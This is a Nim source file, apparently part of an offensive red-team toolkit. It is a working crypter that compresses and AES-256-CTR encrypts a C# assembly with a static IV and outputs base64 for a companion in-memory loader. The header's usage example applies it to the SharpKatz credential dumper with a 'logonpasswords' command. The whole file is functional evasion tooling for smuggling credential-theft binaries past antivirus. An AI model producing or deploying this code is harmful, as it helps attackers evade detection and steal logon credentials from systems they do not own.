#[
    Authors: Marcello Salvati (@byt3bl33d3r), @S3cur3Th1sSh1t, @snovvcrash
    License: BSD 3-Clause
    References:
      - https://github.com/khchen/winim/blob/master/examples/clr/usage_demo2.nim
      - https://github.com/byt3bl33d3r/OffensiveNim

    Usage:
      Cmd > nim c encrypt_assembly.nim
      Cmd > nim c encrypted_assembly_loader.nim
      Cmd > .\encrypt_assembly.exe <PASSWORD> <CSHARP_BINARY.EXE> <ENCRYPTED_B64.TXT>
      Cmd > .\encrypted_assembly_loader.exe <PASSWORD> <ENCRYPTED_B64.TXT> [ARG1] [ARG1] ...

    Example with https://github.com/b4rtik/SharpKatz:
      Cmd > .\encrypt_assembly.exe Passw0rd! SharpKatz.exe sharpkatz.txt
      Cmd > .\encrypted_assembly_loader.exe Passw0rd! sharpkatz.txt --Command logonpasswords
]#

import os
import strformat
import base64
import nimcrypto
import nimcrypto/sysrand
import zippy

func toByteSeq*(str: string): seq[byte] {.inline.} =
    # Converts a string to the corresponding byte sequence
    @(str.toOpenArrayByte(0, str.high))


let
    password: string = paramStr(1)
    inFile: string = paramStr(2)
    outFile: string = paramStr(3)

var
    inFileContents: string = compress(readFile(inFile),9,dfGzip)
    plaintext: seq[byte] = toByteSeq(inFileContents)
    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    encrypted: seq[byte] = newSeq[byte](len(plaintext))

# Set static IV
iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

# Expand key to 32 bytes using SHA256 as the KDF
var expandedKey = sha256.digest(password)
copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

echo fmt"[*] Encrypting {inFile} binary using password: {password}"

ectx.init(key, iv)
ectx.encrypt(plaintext, encrypted)
ectx.clear()

# Base64 encode encrypted assembly
let encodedCrypted = encode(encrypted)

echo fmt"[*] Writing encrypted base64 encoded assembly to: {outFile}"

writeFile(outFile, encodedCrypted)
